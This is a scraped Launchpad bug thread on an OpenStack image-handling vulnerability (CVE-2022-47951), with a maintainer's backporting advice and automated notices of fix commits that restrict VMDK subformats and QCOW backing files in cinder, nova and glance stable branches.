| [Brian Rosmaita (brian-rosmaita)](https://launchpad.net/~brian-rosmaita) wrote on 2023-01-31: |  |  | [#173](/nova/%2Bbug/1996188/comments/173) |
| --- | --- | --- | --- |

I backported the fix as far as stable/train so the Cinder project would at least make an attempt at a fix that supported python 2.7. Nova EOL'd queens, rocky, and stein in November 2022, which in my opinion effectively EOL's those branches for openstack in general (plus, the cinder gates are currently nonfunctional for stein and rocky); the last release of openstack to support python 2.7 is the train series.

The issue with oslo.utils.imageutils is that support for the 'format-specific' attribute of the json qemu-img info output was introduced in 4.1.0, which is python-3-only. However, support for reading the json output of qemu-img info was introduced in 3.14.0. Not sure how that matches up branch-wise, but oslo.utils rocky-em tag is the same as 3.36.5. So being able to read json isn't an issue.

If you want to backport the CVE-2022-47951 fix to rocky for Cinder, you'll need to do two things (as discussed in comment #86 above):

1. backport change Ia0353204abf8, which is commit 9f9194d804c in stable/train, to rocky. This will make cinder request json output from qemu-img-info

2. backport the cinder-1996188-train.patch attached to this bug (it's not in stable/train yet ... the stein and rocky gates aren't the only ones having issues!) which you can see in gerrit as [https://review.opendev.org/c/openstack/cinder/+/871631](https://review.opendev.org/c/openstack/cinder/%2B/871631). It includes code that will get the format-specific stuff out of the qemu-img info response if oslo.utils isn't able to do it.

The code is so old at that point that both those patches will produce conflicts (because they'll refer to stuff in train that isn't present in rocky), but hopefully the conflicts won't be too bad to resolve.

I'm not sure exactly what you'll need to do for nova. I suspect that json support was added to oslo.utils.imageutils specifically for nova, so you probably won't have to worry about part 1 of the cinder backport (though definitely verify that i'm correct about that). You'll need to make the same adjustment for oslo.utils <4.1.0 that we made in cinder; you can see it on the train patch here:

[https://review.opendev.org/c/openstack/cinder/+/871631/1/cinder/image/image\_utils.py#137](https://review.opendev.org/c/openstack/cinder/%2B/871631/1/cinder/image/image_utils.py#137)

Hopefully it's obvious where to do that in the nova patch. Good luck!

I backported the fix as far as stable/train so the Cinder project would at least make an attempt at a fix that supported python 2.7. Nova EOL'd queens, rocky, and stein in November 2022, which in my opinion effectively EOL's those branches for openstack in general (plus, the cinder gates are currently nonfunctional for stein and rocky); the last release of openstack to support python 2.7 is the train series.
The issue with oslo.utils.imageutils is that support for the 'format-specific' attribute of the json qemu-img info output was introduced in 4.1.0, which is python-3-only. However, support for reading the json output of qemu-img info was introduced in 3.14.0. Not sure how that matches up branch-wise, but oslo.utils rocky-em tag is the same as 3.36.5. So being able to read json isn't an issue.
If you want to backport the CVE-2022-47951 fix to rocky for Cinder, you'll need to do two things (as discussed in comment #86 above):
1. backport change Ia0353204abf8, which is commit 9f9194d804c in stable/train, to rocky. This will make cinder request json output from qemu-img-info
2. backport the cinder-1996188-train.patch attached to this bug (it's not in stable/train yet ... the stein and rocky gates aren't the only ones having issues!) which you can see in gerrit as https://review.opendev.org/c/openstack/cinder/+/871631. It includes code that will get the format-specific stuff out of the qemu-img info response if oslo.utils isn't able to do it.
The code is so old at that point that both those patches will produce conflicts (because they'll refer to stuff in train that isn't present in rocky), but hopefully the conflicts won't be too bad to resolve.
I'm not sure exactly what you'll need to do for nova. I suspect that json support was added to oslo.utils.imageutils specifically for nova, so you probably won't have to worry about part 1 of the cinder backport (though definitely verify that i'm correct about that). You'll need to make the same adjustment for oslo.utils <4.1.0 that we made in cinder; you can see it on the train patch here:
https://review.opendev.org/c/openstack/cinder/+/871631/1/cinder/image/image\_utils.py#137
Hopefully it's obvious where to do that in the nova patch. Good luck!

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [OpenStack Infra (hudson-openstack)](https://launchpad.net/~hudson-openstack) wrote on 2023-02-01:  [**Fix merged to cinder (stable/wallaby)**](/nova/%2Bbug/1996188/comments/174) |  |  | [#174](/nova/%2Bbug/1996188/comments/174) |
| --- | --- | --- | --- |

Reviewed: [https://review.opendev.org/c/openstack/cinder/+/871627](https://review.opendev.org/c/openstack/cinder/%2B/871627)

Committed: <https://opendev.org/openstack/cinder/commit/be11d54ac420e0ebc0da6917d7ffc3af59b40f24>

Submitter: "Zuul (22348)"

Branch: stable/wallaby

commit be11d54ac420e0ebc0da6917d7ffc3af59b40f24

Author: Brian Rosmaita <email address hidden>

Date: Wed Jan 11 09:50:29 2023 -0500

Check VMDK subformat against an allowed list

Also add a more general check to convert\_image that the image format

    reported by qemu-img matches what the caller says it is.

Change-Id: I3c60ee4c0795aadf03108ed9b5a46ecd116894af

    Partial-bug: #1996188

    (cherry picked from commit 930fc93e9fda82a4aa4568ae149c3c80af7379d0)

    (cherry picked from commit ba37dc2ead69c08d7ede242295ff997086e6121d)

    Conflicts:

      cinder/image/image\_utils.py

       - changed type annotations to use implicit Optional to be

         consistent with cinder yoga mypy usage

       - removed refs to image\_conversion\_disable in tests

    (cherry picked from commit 2ae5d53526e2b224d81b3259140c59aba97d72c3)

    (cherry picked from commit e96415409daa158cc503c1adec1ca1ca4f940082)

    Conflicts:

      cinder/image/image\_utils.py

       - removed type annotations

       - restored wallaby-era fetch\_verify\_image() function signature

Reviewed: https://review.opendev.org/c/openstack/cinder/+/871627
Committed: https://opendev.org/openstack/cinder/commit/be11d54ac420e0ebc0da6917d7ffc3af59b40f24
Submitter: "Zuul (22348)"
Branch: stable/wallaby
commit be11d54ac420e0ebc0da6917d7ffc3af59b40f24
Author: Brian Rosmaita <rosmaita.fossdev@gmail.com>
Date: Wed Jan 11 09:50:29 2023 -0500
Check VMDK subformat against an allowed list
Also add a more general check to convert\_image that the image format
reported by qemu-img matches what the caller says it is.
Change-Id: I3c60ee4c0795aadf03108ed9b5a46ecd116894af
Partial-bug: #1996188
(cherry picked from commit 930fc93e9fda82a4aa4568ae149c3c80af7379d0)
(cherry picked from commit ba37dc2ead69c08d7ede242295ff997086e6121d)
Conflicts:
cinder/image/image\_utils.py
- changed type annotations to use implicit Optional to be
consistent with cinder yoga mypy usage
- removed refs to image\_conversion\_disable in tests
(cherry picked from commit 2ae5d53526e2b224d81b3259140c59aba97d72c3)
(cherry picked from commit e96415409daa158cc503c1adec1ca1ca4f940082)
Conflicts:
cinder/image/image\_utils.py
- removed type annotations
- restored wallaby-era fetch\_verify\_image() function signature

| **tags**: | added: in-stable-wallaby |
| --- | --- |

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [OpenStack Infra (hudson-openstack)](https://launchpad.net/~hudson-openstack) wrote on 2023-02-01:  [**Fix merged to cinder (stable/victoria)**](/nova/%2Bbug/1996188/comments/175) |  |  | [#175](/nova/%2Bbug/1996188/comments/175) |
| --- | --- | --- | --- |

Reviewed: [https://review.opendev.org/c/openstack/cinder/+/871628](https://review.opendev.org/c/openstack/cinder/%2B/871628)

Committed: <https://opendev.org/openstack/cinder/commit/17565262dafb5beeaec8e9e249e760fc64f3df93>

Submitter: "Zuul (22348)"

Branch: stable/victoria

commit 17565262dafb5beeaec8e9e249e760fc64f3df93

Author: Brian Rosmaita <email address hidden>

Date: Sat Jan 14 07:06:27 2023 -0500

Check VMDK subformat against an allowed list

Also add a more general check to convert\_image that the image format

    reported by qemu-img matches what the caller says it is.

Change-Id: I3c60ee4c0795aadf03108ed9b5a46ecd116894af

    Partial-bug: #1996188

    (cherry picked from commit 930fc93e9fda82a4aa4568ae149c3c80af7379d0)

    (cherry picked from commit ba37dc2ead69c08d7ede242295ff997086e6121d)

    Conflicts:

      cinder/image/image\_utils.py

       - changed type annotations to use implicit Optional to be

         consistent with cinder yoga mypy usage

       - removed refs to image\_conversion\_disable in tests

    (cherry picked from commit 2ae5d53526e2b224d81b3259140c59aba97d72c3)

    (cherry picked from commit e96415409daa158cc503c1adec1ca1ca4f940082)

    Conflicts:

      cinder/image/image\_utils.py

       - removed type annotations

       - restored wallaby-era fetch\_verify\_image() function signature

    (cherry picked from commit be11d54ac420e0ebc0da6917d7ffc3af59b40f24)

    Conflicts:

      cinder/tests/unit/test\_image\_utils.py

       - did not include extraneous test from be11d54ac's parent commit

    Additions:

      cinder/image/image\_utils.py

       - added code to handle oslo.utils<4.1.0,>=3.14.0

      cinder/tests/unit/test\_image\_utils.py

       - added a test for ^^

Reviewed: https://review.opendev.org/c/openstack/cinder/+/871628
Committed: https://opendev.org/openstack/cinder/commit/17565262dafb5beeaec8e9e249e760fc64f3df93
Submitter: "Zuul (22348)"
Branch: stable/victoria
commit 17565262dafb5beeaec8e9e249e760fc64f3df93
Author: Brian Rosmaita <rosmaita.fossdev@gmail.com>
Date: Sat Jan 14 07:06:27 2023 -0500
Check VMDK subformat against an allowed list
Also add a more general check to convert\_image that the image format
reported by qemu-img matches what the caller says it is.
Change-Id: I3c60ee4c0795aadf03108ed9b5a46ecd116894af
Partial-bug: #1996188
(cherry picked from commit 930fc93e9fda82a4aa4568ae149c3c80af7379d0)
(cherry picked from commit ba37dc2ead69c08d7ede242295ff997086e6121d)
Conflicts:
cinder/image/image\_utils.py
- changed type annotations to use implicit Optional to be
consistent with cinder yoga mypy usage
- removed refs to image\_conversion\_disable in tests
(cherry picked from commit 2ae5d53526e2b224d81b3259140c59aba97d72c3)
(cherry picked from commit e96415409daa158cc503c1adec1ca1ca4f940082)
Conflicts:
cinder/image/image\_utils.py
- removed type annotations
- restored wallaby-era fetch\_verify\_image() function signature
(cherry picked from commit be11d54ac420e0ebc0da6917d7ffc3af59b40f24)
Conflicts:
cinder/tests/unit/test\_image\_utils.py
- did not include extraneous test from be11d54ac's parent commit
Additions:
cinder/image/image\_utils.py
- added code to handle oslo.utils<4.1.0,>=3.14.0
cinder/tests/unit/test\_image\_utils.py
- added a test for ^^

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [OpenStack Infra (hudson-openstack)](https://launchpad.net/~hudson-openstack) wrote on 2023-02-07:  [**Related fix merged to nova (stable/wallaby)**](/nova/%2Bbug/1996188/comments/176) |  |  | [#176](/nova/%2Bbug/1996188/comments/176) |
| --- | --- | --- | --- |

Reviewed: [https://review.opendev.org/c/openstack/nova/+/871557](https://review.opendev.org/c/openstack/nova/%2B/871557)

Committed: <https://opendev.org/openstack/nova/commit/719a2a6089ec240d23caeb93ac25ed5259d8d9bc>

Submitter: "Zuul (22348)"

Branch: stable/wallaby

commit 719a2a6089ec240d23caeb93ac25ed5259d8d9bc

Author: Dan Smith <email address hidden>

Date: Thu Nov 10 09:55:48 2022 -0800

[stable-only][cve] Check VMDK create-type against an allowed list

NOTE(sbauza): Stable policy allows us to proactively merge a backport without waiting for the parent patch to be merged (exception to rule #4 in [1]. Marking [stable-only] in order to silence nova-tox-validate-backport

[1] <https://docs.openstack.org/project-team-guide/stable-branches.html#appropriate-fixes>

Related-Bug: #1996188

    Change-Id: I5a399f1d3d702bfb76c067893e9c924904c8c360

Reviewed: https://review.opendev.org/c/openstack/nova/+/871557
Committed: https://opendev.org/openstack/nova/commit/719a2a6089ec240d23caeb93ac25ed5259d8d9bc
Submitter: "Zuul (22348)"
Branch: stable/wallaby
commit 719a2a6089ec240d23caeb93ac25ed5259d8d9bc
Author: Dan Smith <dansmith@redhat.com>
Date: Thu Nov 10 09:55:48 2022 -0800
[stable-only][cve] Check VMDK create-type against an allowed list
NOTE(sbauza): Stable policy allows us to proactively merge a backport without waiting for the parent patch to be merged (exception to rule #4 in [1]. Marking [stable-only] in order to silence nova-tox-validate-backport
[1] https://docs.openstack.org/project-team-guide/stable-branches.html#appropriate-fixes
Related-Bug: #1996188
Change-Id: I5a399f1d3d702bfb76c067893e9c924904c8c360

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [OpenStack Infra (hudson-openstack)](https://launchpad.net/~hudson-openstack) wrote on 2023-02-16:  [**Fix merged to cinder (stable/ussuri)**](/nova/%2Bbug/1996188/comments/177) |  |  | [#177](/nova/%2Bbug/1996188/comments/177) |
| --- | --- | --- | --- |

Reviewed: [https://review.opendev.org/c/openstack/cinder/+/871629](https://review.opendev.org/c/openstack/cinder/%2B/871629)

Committed: <https://opendev.org/openstack/cinder/commit/9902c17927b69e0b2379dfe8d2a2b89244162526>

Submitter: "Zuul (22348)"

Branch: stable/ussuri

commit 9902c17927b69e0b2379dfe8d2a2b89244162526

Author: Brian Rosmaita <email address hidden>

Date: Mon Jan 16 14:44:04 2023 -0500

Check VMDK subformat against an allowed list

Also add a more general check to convert\_image that the image format

    reported by qemu-img matches what the caller says it is.

Change-Id: I3c60ee4c0795aadf03108ed9b5a46ecd116894af

    Partial-bug: #1996188

    (cherry picked from commit 930fc93e9fda82a4aa4568ae149c3c80af7379d0)

    (cherry picked from commit ba37dc2ead69c08d7ede242295ff997086e6121d)

    Conflicts:

      cinder/image/image\_utils.py

       - changed type annotations to use implicit Optional to be

         consistent with cinder yoga mypy usage

       - removed refs to image\_conversion\_disable in tests

    (cherry picked from commit 2ae5d53526e2b224d81b3259140c59aba97d72c3)

    (cherry picked from commit e96415409daa158cc503c1adec1ca1ca4f940082)

    Conflicts:

      cinder/image/image\_utils.py

       - removed type annotations

       - restored wallaby-era fetch\_verify\_image() function signature

    (cherry picked from commit be11d54ac420e0ebc0da6917d7ffc3af59b40f24)

    Conflicts:

      cinder/tests/unit/test\_image\_utils.py

       - did not include extraneous test from be11d54ac's parent commit

    Additions:

      cinder/image/image\_utils.py

       - added code to handle oslo.utils<4.1.0,>=3.14.0

      cinder/tests/unit/test\_image\_utils.py

       - added a test for ^^

    (cherry picked from commit 17565262dafb5beeaec8e9e249e760fc64f3df93)

    Conflicts:

      cinder/image/image\_utils.py

       - removed src\_passphrase\_file parameter to convert\_image() that was

         introduced in victoria by change I896f70d204ad103e

      cinder/tests/unit/test\_image\_utils.py

       - removed references to ddt.TestNameFormat (not present in this

         version of ddt)

Reviewed: https://review.opendev.org/c/openstack/cinder/+/871629
Committed: https://opendev.org/openstack/cinder/commit/9902c17927b69e0b2379dfe8d2a2b89244162526
Submitter: "Zuul (22348)"
Branch: stable/ussuri
commit 9902c17927b69e0b2379dfe8d2a2b89244162526
Author: Brian Rosmaita <rosmaita.fossdev@gmail.com>
Date: Mon Jan 16 14:44:04 2023 -0500
Check VMDK subformat against an allowed list
Also add a more general check to convert\_image that the image format
reported by qemu-img matches what the caller says it is.
Change-Id: I3c60ee4c0795aadf03108ed9b5a46ecd116894af
Partial-bug: #1996188
(cherry picked from commit 930fc93e9fda82a4aa4568ae149c3c80af7379d0)
(cherry picked from commit ba37dc2ead69c08d7ede242295ff997086e6121d)
Conflicts:
cinder/image/image\_utils.py
- changed type annotations to use implicit Optional to be
consistent with cinder yoga mypy usage
- removed refs to image\_conversion\_disable in tests
(cherry picked from commit 2ae5d53526e2b224d81b3259140c59aba97d72c3)
(cherry picked from commit e96415409daa158cc503c1adec1ca1ca4f940082)
Conflicts:
cinder/image/image\_utils.py
- removed type annotations
- restored wallaby-era fetch\_verify\_image() function signature
(cherry picked from commit be11d54ac420e0ebc0da6917d7ffc3af59b40f24)
Conflicts:
cinder/tests/unit/test\_image\_utils.py
- did not include extraneous test from be11d54ac's parent commit
Additions:
cinder/image/image\_utils.py
- added code to handle oslo.utils<4.1.0,>=3.14.0
cinder/tests/unit/test\_image\_utils.py
- added a test for ^^
(cherry picked from commit 17565262dafb5beeaec8e9e249e760fc64f3df93)
Conflicts:
cinder/image/image\_utils.py
- removed src\_passphrase\_file parameter to convert\_image() that was
introduced in victoria by change I896f70d204ad103e
cinder/tests/unit/test\_image\_utils.py
- removed references to ddt.TestNameFormat (not present in this
version of ddt)

| **tags**: | added: in-stable-ussuri |
| --- | --- |

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [OpenStack Infra (hudson-openstack)](https://launchpad.net/~hudson-openstack) wrote on 2023-02-22:  [**Fix merged to glance (stable/ussuri)**](/nova/%2Bbug/1996188/comments/178) |  |  | [#178](/nova/%2Bbug/1996188/comments/178) |
| --- | --- | --- | --- |

Reviewed: [https://review.opendev.org/c/openstack/glance/+/871626](https://review.opendev.org/c/openstack/glance/%2B/871626)

Committed: <https://opendev.org/openstack/glance/commit/b60fb70c9faf3b73eb4d8a73cd5cb09f2fa70a61>

Submitter: "Zuul (22348)"

Branch: stable/ussuri

commit b60fb70c9faf3b73eb4d8a73cd5cb09f2fa70a61

Author: Dan Smith <email address hidden>

Date: Mon Dec 19 15:00:35 2022 +0000

Enforce image safety during image\_conversion

This does two things:

1. It makes us check that the QCOW backing\_file is unset on those

    types of images. Nova and Cinder do this already to prevent an

    arbitrary (and trivial to accomplish) host file exposure exploit.

    2. It makes us restrict VMDK files to only allowed subtypes. These

    files can name arbitrary files on disk as extents, providing the

    same sort of attack. Default that list to just the types we believe

    are actually useful for openstack, and which are monolithic.

The configuration option to specify allowed subtypes is added in

    glance's config and not in the import options so that we can extend

    this check later to image ingest. The format\_inspector can tell us

    what the type and subtype is, and we could reject those images early

    and even in the case where image\_conversion is not enabled.

Closes-Bug: #1996188

    Change-Id: Idf561f6306cebf756c787d8eefdc452ce44bd5e0

    (cherry picked from commit 0d6282a01691cecc2798f7858b181c4bb30f850c)

    (cherry picked from commit 4967ab6935cfd0274ae801ac943d01909a236a0a)

    (cherry picked from commit dc8e5a5cc7f5e9d1b697e520a7533cc90516db1b)

    (cherry picked from commit f45b5f024e765f0000884dfec5ac222124cfbc6d)

    (cherry picked from commit 9a98c4a7d1358cdae009cc8fb6377160a126ea7b)

    Conflicts: glance/tests/unit/async\_/flows/plugins/test\_image\_conversion.py

       - removed code related to missing tests - 050802dd67b9135e04a65d340531157c94248c51

    (cherry picked from commit 06e6be579156d8bf2ce8e021d07d6f351fb88c07)

Reviewed: https://review.opendev.org/c/openstack/glance/+/871626
Committed: https://opendev.org/openstack/glance/commit/b60fb70c9faf3b73eb4d8a73cd5cb09f2fa70a61
Submitter: "Zuul (22348)"
Branch: stable/ussuri
commit b60fb70c9faf3b73eb4d8a73cd5cb09f2fa70a61
Author: Dan Smith <dansmith@redhat.com>
Date: Mon Dec 19 15:00:35 2022 +0000
Enforce image safety during image\_conversion
This does two things:
1. It makes us check that the QCOW backing\_file is unset on those
types of images. Nova and Cinder do this already to prevent an
arbitrary (and trivial to accomplish) host file exposure exploit.
2. It makes us restrict VMDK files to only allowed subtypes. These
files can name arbitrary files on disk as extents, providing the
same sort of attack. Default that list to just the types we believe
are actually useful for openstack, and which are monolithic.
The configuration option to specify allowed subtypes is added in
glance's config and not in the import options so that we can extend
this check later to image ingest. The format\_inspector can tell us
what the type and subtype is, and we could reject those images early
and even in the case where image\_conversion is not enabled.
Closes-Bug: #1996188
Change-Id: Idf561f6306cebf756c787d8eefdc452ce44bd5e0
(cherry picked from commit 0d6282a01691cecc2798f7858b181c4bb30f850c)
(cherry picked from commit 4967ab6935cfd0274ae801ac943d01909a236a0a)
(cherry picked from commit dc8e5a5cc7f5e9d1b697e520a7533cc90516db1b)
(cherry picked from commit f45b5f024e765f0000884dfec5ac222124cfbc6d)
(cherry picked from commit 9a98c4a7d1358cdae009cc8fb6377160a126ea7b)
Conflicts: glance/tests/unit/async\_/flows/plugins/test\_image\_conversion.py
- removed code related to missing tests - 050802dd67b9135e04a65d340531157c94248c51
(cherry picked from commit 06e6be579156d8bf2ce8e021d07d6f351fb88c07)

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [OpenStack Infra (hudson-openstack)](https://launchpad.net/~hudson-openstack) wrote on 2023-02-23:  [**Related fix merged to nova (stable/ussuri)**](/nova/%2Bbug/1996188/comments/179) |  |  | [#179](/nova/%2Bbug/1996188/comments/179) |
| --- | --- | --- | --- |

Reviewed: [https://review.opendev.org/c/openstack/nova/+/871702](https://review.opendev.org/c/openstack/nova/%2B/871702)

Committed: <https://opendev.org/openstack/nova/commit/3fe8880d3759cbd7b19d75dcf235dfd5c511be13>

Submitter: "Zuul (22348)"

Branch: stable/ussuri

commit 3fe8880d3759cbd7b19d75dcf235dfd5c511be13

Author: Dan Smith <email address hidden>

Date: Thu Nov 10 09:55:48 2022 -0800

[stable-only][cve] Check VMDK create-type against an allowed list

NOTE(sbauza): Stable policy allows us to proactively merge a backport without waiting for the parent patch to be merged (exception to rule #4 in [1]. Marking [stable-only] in order to silence nova-tox-validate-backport

[1] <https://docs.openstack.org/project-team-guide/stable-branches.html#appropriate-fixes>

Conflicts vs victoria in:

            nova/conf/compute.py

Related-Bug: #1996188

    Change-Id: I5a399f1d3d702bfb76c067893e9c924904c8c360

Reviewed: https://review.opendev.org/c/openstack/nova/+/871702
Committed: https://opendev.org/openstack/nova/commit/3fe8880d3759cbd7b19d75dcf235dfd5c511be13
Submitter: "Zuul (22348)"
Branch: stable/ussuri
commit 3fe8880d3759cbd7b19d75dcf235dfd5c511be13
Author: Dan Smith <dansmith@redhat.com>
Date: Thu Nov 10 09:55:48 2022 -0800
[stable-only][cve] Check VMDK create-type against an allowed list
NOTE(sbauza): Stable policy allows us to proactively merge a backport without waiting for the parent patch to be merged (exception to rule #4 in [1]. Marking [stable-only] in order to silence nova-tox-validate-backport
[1] https://docs.openstack.org/project-team-guide/stable-branches.html#appropriate-fixes
Conflicts vs victoria in:
nova/conf/compute.py
Related-Bug: #1996188
Change-Id: I5a399f1d3d702bfb76c067893e9c924904c8c360

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [OpenStack Infra (hudson-openstack)](https://launchpad.net/~hudson-openstack) wrote on 2023-02-24:  [**Fix included in openstack/glance 26.0.0.0b3**](/nova/%2Bbug/1996188/comments/180) |  |  | [#180](/nova/%2Bbug/1996188/comments/180) |
| --- | --- | --- | --- |

This issue was fixed in the openstack/glance 26.0.0.0b3 development milestone.

This issue was fixed in the openstack/glance 26.0.0.0b3 development milestone.

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [OpenStack Infra (hudson-openstack)](https://launchpad.net/~hudson-openstack) wrote on 2023-03-07:  [**Fix merged to glance (stable/train)**](/nova/%2Bbug/1996188/comments/181) |  |  | [#181](/nova/%2Bbug/1996188/comments/181) |
| --- | --- | --- | --- |

Reviewed: [https://review.opendev.org/c/openstack/glance/+/871630](https://review.opendev.org/c/openstack/glance/%2B/871630)

Committed: <https://opendev.org/openstack/glance/commit/7756a90b7dacf44061d473eb03b92d2a40a307f6>

Submitter: "Zuul (22348)"

Branch: stable/train

commit 7756a90b7dacf44061d473eb03b92d2a40a307f6

Author: Dan Smith <email address hidden>

Date: Mon Dec 19 15:00:35 2022 +0000

Enforce image safety during image\_conversion

This does two things:

1. It makes us check that the QCOW backing\_file is unset on those

    types of images. Nova and Cinder do this already to prevent an

    arbitrary (and trivial to accomplish) host file exposure exploit.

    2. It makes us restrict VMDK files to only allowed subtypes. These

    files can name arbitrary files on disk as extents, providing the

    same sort of attack. Default that list to just the types we believe

    are actually useful for openstack, and which are monolithic.

The configuration option to specify allowed subtypes is added in

    glance's config and not in the import options so that we can extend

    this check later to image ingest. The format\_inspector can tell us

    what the type and subtype is, and we could reject those images early

    and even in the case where image\_conversion is not enabled.

Some changes were required in the backport in order to pass the CI:

    Pep8 fix: ignore H703 errors.

    Py27 fix: FileNotFoundError did not exist in Python2.7.

Closes-Bug: #1996188

    Change-Id: Idf561f6306cebf756c787d8eefdc452ce44bd5e0

    (cherry picked from commit 0d6282a01691cecc2798f7858b181c4bb30f850c)

    (cherry picked from commit 4967ab6935cfd0274ae801ac943d01909a236a0a)

    (cherry picked from commit dc8e5a5cc7f5e9d1b697e520a7533cc90516db1b)

    (cherry picked from commit f45b5f024e765f0000884dfec5ac222124cfbc6d)

    (cherry picked from commit 9a98c4a7d1358cdae009cc8fb6377160a126ea7b)

    Conflicts: glance/tests/unit/async\_/flows/plugins/test\_image\_conversion.py

       - removed code related to missing tests - 050802dd67b9135e04a65d340531157c94248c51

    (cherry picked from commit 06e6be579156d8bf2ce8e021d07d6f351fb88c07)

    (cherry picked from commit b60fb70c9faf3b73eb4d8a73cd5cb09f2fa70a61)

Reviewed: https://review.opendev.org/c/openstack/glance/+/871630
Committed: https://opendev.org/openstack/glance/commit/7756a90b7dacf44061d473eb03b92d2a40a307f6
Submitter: "Zuul (22348)"
Branch: stable/train
commit 7756a90b7dacf44061d473eb03b92d2a40a307f6
Author: Dan Smith <dansmith@redhat.com>
Date: Mon Dec 19 15:00:35 2022 +0000
Enforce image safety during image\_conversion
This does two things:
1. It makes us check that the QCOW backing\_file is unset on those
types of images. Nova and Cinder do this already to prevent an
arbitrary (and trivial to accomplish) host file exposure exploit.
2. It makes us restrict VMDK files to only allowed subtypes. These
files can name arbitrary files on disk as extents, providing the
same sort of attack. Default that list to just the types we believe
are actually useful for openstack, and which are monolithic.
The configuration option to specify allowed subtypes is added in
glance's config and not in the import options so that we can extend
this check later to image ingest. The format\_inspector can tell us
what the type and subtype is, and we could reject those images early
and even in the case where image\_conversion is not enabled.
Some changes were required in the backport in order to pass the CI:
Pep8 fix: ignore H703 errors.
Py27 fix: FileNotFoundError did not exist in Python2.7.
Closes-Bug: #1996188
Change-Id: Idf561f6306cebf756c787d8eefdc452ce44bd5e0
(cherry picked from commit 0d6282a01691cecc2798f7858b181c4bb30f850c)
(cherry picked from commit 4967ab6935cfd0274ae801ac943d01909a236a0a)
(cherry picked from commit dc8e5a5cc7f5e9d1b697e520a7533cc90516db1b)
(cherry picked from commit f45b5f024e765f0000884dfec5ac222124cfbc6d)
(cherry picked from commit 9a98c4a7d1358cdae009cc8fb6377160a126ea7b)
Conflicts: glance/tests/unit/async\_/flows/plugins/test\_image\_conversion.py
- removed code related to missing tests - 050802dd67b9135e04a65d340531157c94248c51
(cherry picked from commit 06e6be579156d8bf2ce8e021d07d6f351fb88c07)
(cherry picked from commit b60fb70c9faf3b73eb4d8a73cd5cb09f2fa70a61)

| **tags**: | added: in-stable-train |
| --- | --- |

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [OpenStack Infra (hudson-openstack)](https://launchpad.net/~hudson-openstack) wrote on 2023-03-09:  [**Fix merged to glance (stable/wallaby)**](/nova/%2Bbug/1996188/comments/182) |  |  | [#182](/nova/%2Bbug/1996188/comments/182) |
| --- | --- | --- | --- |

Reviewed: [https://review.opendev.org/c/openstack/glance/+/871621](https://review.opendev.org/c/openstack/glance/%2B/871621)

Committed: <https://opendev.org/openstack/glance/commit/9a98c4a7d1358cdae009cc8fb6377160a126ea7b>

Submitter: "Zuul (22348)"

Branch: stable/wallaby

commit 9a98c4a7d1358cdae009cc8fb6377160a126ea7b

Author: Dan Smith <email address hidden>

Date: Mon Dec 19 15:00:35 2022 +0000

Enforce image safety during image\_conversion

This does two things:

1. It makes us check that the QCOW backing\_file is unset on those

    types of images. Nova and Cinder do this already to prevent an

    arbitrary (and trivial to accomplish) host file exposure exploit.

    2. It makes us restrict VMDK files to only allowed subtypes. These

    files can name arbitrary files on disk as extents, providing the

    same sort of attack. Default that list to just the types we believe

    are actually useful for openstack, and which are monolithic.

The configuration option to specify allowed subtypes is added in

    glance's config and not in the import options so that we can extend

    this check later to image ingest. The format\_inspector can tell us

    what the type and subtype is, and we could reject those images early

    and even in the case where image\_conversion is not enabled.

Closes-Bug: #1996188

    Change-Id: Idf561f6306cebf756c787d8eefdc452ce44bd5e0

    (cherry picked from commit 0d6282a01691cecc2798f7858b181c4bb30f850c)

    (cherry picked from commit 4967ab6935cfd0274ae801ac943d01909a236a0a)

    (cherry picked from commit dc8e5a5cc7f5e9d1b697e520a7533cc90516db1b)

    (cherry picked from commit f45b5f024e765f0000884dfec5ac222124cfbc6d)

Reviewed: https://review.opendev.org/c/openstack/glance/+/871621
Committed: https://opendev.org/openstack/glance/commit/9a98c4a7d1358cdae009cc8fb6377160a126ea7b
Submitter: "Zuul (22348)"
Branch: stable/wallaby
commit 9a98c4a7d1358cdae009cc8fb6377160a126ea7b
Author: Dan Smith <dansmith@redhat.com>
Date: Mon Dec 19 15:00:35 2022 +0000
Enforce image safety during image\_conversion
This does two things:
1. It makes us check that the QCOW backing\_file is unset on those
types of images. Nova and Cinder do this already to prevent an
arbitrary (and trivial to accomplish) host file exposure exploit.
2. It makes us restrict VMDK files to only allowed subtypes. These
files can name arbitrary files on disk as extents, providing the
same sort of attack. Default that list to just the types we believe
are actually useful for openstack, and which are monolithic.
The configuration option to specify allowed subtypes is added in
glance's config and not in the import options so that we can extend
this check later to image ingest. The format\_inspector can tell us
what the type and subtype is, and we could reject those images early
and even in the case where image\_conversion is not enabled.
Closes-Bug: #1996188
Change-Id: Idf561f6306cebf756c787d8eefdc452ce44bd5e0
(cherry picked from commit 0d6282a01691cecc2798f7858b181c4bb30f850c)
(cherry picked from commit 4967ab6935cfd0274ae801ac943d01909a236a0a)
(cherry picked from commit dc8e5a5cc7f5e9d1b697e520a7533cc90516db1b)
(cherry picked from commit f45b5f024e765f0000884dfec5ac222124cfbc6d)

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [OpenStack Infra (hudson-openstack)](https://launchpad.net/~hudson-openstack) wrote on 2023-03-10:  [**Fix merged to cinder (stable/train)**](/nova/%2Bbug/1996188/comments/183) |  |  | [#183](/nova/%2Bbug/1996188/comments/183) |
| --- | --- | --- | --- |

Reviewed: [https://review.opendev.org/c/openstack/cinder/+/871631](https://review.opendev.org/c/openstack/cinder/%2B/871631)

Committed: <https://opendev.org/openstack/cinder/commit/e40a0bea89d4e5c99711f23faf3e18ff420ad100>

Submitter: "Zuul (22348)"

Branch: stable/train

commit e40a0bea89d4e5c99711f23faf3e18ff420ad100

Author: Brian Rosmaita <email address hidden>

Date: Mon Jan 16 14:44:04 2023 -0500

Check VMDK subformat against an allowed list

Also add a more general check to convert\_image that the image format

    reported by qemu-img matches what the caller says it is.

Change-Id: I3c60ee4c0795aadf03108ed9b5a46ecd116894af

    Partial-bug: #1996188

